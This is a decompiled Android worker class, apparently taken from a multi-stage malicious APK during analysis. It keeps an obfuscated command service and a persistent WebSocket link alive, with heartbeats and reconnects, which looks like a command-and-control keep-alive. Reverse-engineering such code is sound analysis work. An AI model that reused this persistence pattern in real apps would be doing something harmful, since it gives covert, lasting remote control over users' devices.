package com.base.template.workers;

import android.content.Context;
import androidx.work.Data;
import androidx.work.ListenableWorker;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
import com.base.template.NativeBridge;
import com.base.template.network.WsPersistManager;
import com.base.template.services.CommandService;
import okhttp3.Headers;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class PingWorker extends Worker {
    public PingWorker(Context context, WorkerParameters workerParameters) {
        super(context, workerParameters);
    }

    @Override // androidx.work.Worker
    public final ListenableWorker.Result doWork() {
        try {
            CommandService commandService = CommandService.instance;
            Headers.Companion.safeStartService(this.mAppContext, C0000.decode(new byte[]{100, 41, 97, 122, 33, 103, 109, 98, 45, 44, 116}, "3f31d522db"));
            Object obj = WsPersistManager.lock;
            if (WsPersistManager.isConnected) {
                WsPersistManager.sendHeartbeat(this.mAppContext);
            } else {
                WsPersistManager.connect(this.mAppContext);
            }
            try {
                NativeBridge.triggerHeartbeat();
            } catch (Exception unused) {
            }
            return new ListenableWorker.Result.Success(Data.EMPTY);
        } catch (Exception e) {
            e.getMessage();
            return new ListenableWorker.Result.Retry();
        }
    }
}
